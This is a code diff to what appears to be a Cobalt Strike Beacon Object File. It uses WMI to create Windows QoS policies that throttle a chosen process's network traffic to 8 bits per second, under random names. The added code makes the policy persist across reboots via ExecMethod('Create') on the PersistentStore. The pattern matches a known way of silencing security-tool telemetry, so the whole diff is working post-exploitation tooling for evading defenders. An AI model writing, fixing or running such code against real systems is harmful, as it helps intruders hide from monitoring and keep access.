@@ -102,6 +102,13 @@ static HRESULT PutByte(IWbemClassObject* o, const wchar_t* p, BYTE v) {
     OLEAUT32$VariantClear(&var); return hr;
 }
 
+static HRESULT PutUI8(IWbemClassObject* o, const wchar_t* p, ULONGLONG v) {
+    VARIANT var; OLEAUT32$VariantInit(&var);
+    var.vt = VT_UI8; var.ullVal = v;
+    HRESULT hr = o->lpVtbl->Put(o, p, 0, &var, 0);
+    OLEAUT32$VariantClear(&var); return hr;
+}
+
 static BOOL SpawnWmiInst(IWbemServices* svc, const wchar_t* cls,
                           IWbemClassObject** ppOut) {
     BSTR b = OLEAUT32$SysAllocString(cls);
@@ -140,6 +147,71 @@ static BOOL CreatePolicyInStore(IWbemServices* svc, const wchar_t* proc,
     HRESULT hr = svc->lpVtbl->PutInstance(svc, pInst,
         WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
     pInst->lpVtbl->Release(pInst);
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "  [!] PutInstance(%S) hr=0x%08X\n", store, hr);
+    }
+    return SUCCEEDED(hr);
+}
+
+/*
+ * PutInstance() does not work for PersistentStore — the WMI provider only
+ * accepts ActiveStore writes via PutInstance. Persistent policies must be
+ * created via ExecMethod("Create") with PolicyStore="PersistentStore".
+ */
+static BOOL CreatePersistViaMethod(IWbemServices* svc, const wchar_t* proc,
+                                     const wchar_t* name) {
+    BSTR cls = OLEAUT32$SysAllocString(L"MSFT_NetQosPolicySettingData");
+
+    /* Get class definition to read Create() method signature */
+    IWbemClassObject* pClass = NULL;
+    if (FAILED(svc->lpVtbl->GetObject(svc, cls, 0, NULL, &pClass, NULL))) {
+        OLEAUT32$SysFreeString(cls);
+        return FALSE;
+    }
+
+    /* Get in-params definition for the Create static method */
+    IWbemClassObject* pInDef = NULL;
+    HRESULT hr = pClass->lpVtbl->GetMethod(pClass, L"Create", 0, &pInDef, NULL);
+    pClass->lpVtbl->Release(pClass);
+    if (FAILED(hr) || !pInDef) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "  [!] GetMethod(Create) hr=0x%08X\n", hr);
+        OLEAUT32$SysFreeString(cls);
+        return FALSE;
+    }
+
+    /* Spawn an instance of the in-params class */
+    IWbemClassObject* pIn = NULL;
+    hr = pInDef->lpVtbl->SpawnInstance(pInDef, 0, &pIn);
+    pInDef->lpVtbl->Release(pInDef);
+    if (FAILED(hr) || !pIn) {
+        OLEAUT32$SysFreeString(cls);
+        return FALSE;
+    }
+
+    /* Fill method parameters — same policy shape as PutInstance(ActiveStore) */
+    PutBstr(pIn, L"Name",                          name);
+    PutBstr(pIn, L"Owner",                         L"machine");
+    PutByte(pIn, L"NetworkProfile",                0);
+    PutBstr(pIn, L"AppPathNameMatchCondition",     proc);
+    PutByte(pIn, L"IPProtocolMatchCondition",      3);
+    PutUI8 (pIn, L"ThrottleRateActionBitsPerSecond", 8);
+    PutBstr(pIn, L"PolicyStore",                   L"PersistentStore");
+
+    /* Call static method on the class (not on an instance) */
+    BSTR meth = OLEAUT32$SysAllocString(L"Create");
+    IWbemClassObject* pOut = NULL;
+    hr = svc->lpVtbl->ExecMethod(svc, cls, meth, 0, NULL, pIn, &pOut, NULL);
+    OLEAUT32$SysFreeString(meth);
+    OLEAUT32$SysFreeString(cls);
+    pIn->lpVtbl->Release(pIn);
+    if (pOut) pOut->lpVtbl->Release(pOut);
+
+    if (FAILED(hr)) {
+        BeaconPrintf(CALLBACK_ERROR,
+            "  [!] ExecMethod(Create/PersistentStore) hr=0x%08X\n", hr);
+    }
     return SUCCEEDED(hr);
 }
 
@@ -147,7 +219,7 @@ static BOOL CreatePolicy(IWbemServices* svc, const wchar_t* proc) {
     wchar_t name[9]; RandName(name, 8);
 
     BOOL okA = CreatePolicyInStore(svc, proc, name, L"ActiveStore");
-    BOOL okP = CreatePolicyInStore(svc, proc, name, L"PersistentStore");
+    BOOL okP = CreatePersistViaMethod(svc, proc, name);
 
     if (!okA && !okP) {
         BeaconPrintf(CALLBACK_ERROR, "  [-] %S: PutInstance failed\n", proc);
